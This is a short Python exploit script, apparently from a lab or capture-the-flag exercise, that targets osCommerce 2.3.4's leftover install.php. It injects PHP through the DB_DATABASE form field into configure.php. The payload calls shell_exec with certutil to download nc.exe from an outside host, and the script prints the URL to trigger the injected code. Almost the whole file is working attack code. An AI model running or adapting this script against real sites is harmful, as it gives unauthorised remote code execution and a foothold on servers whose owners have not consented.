import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://10.10.215.126:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.215.126:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.11.3.122/nc.exe nc.exe");'
payload += 'echo $var;'
payload += '/*'


data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")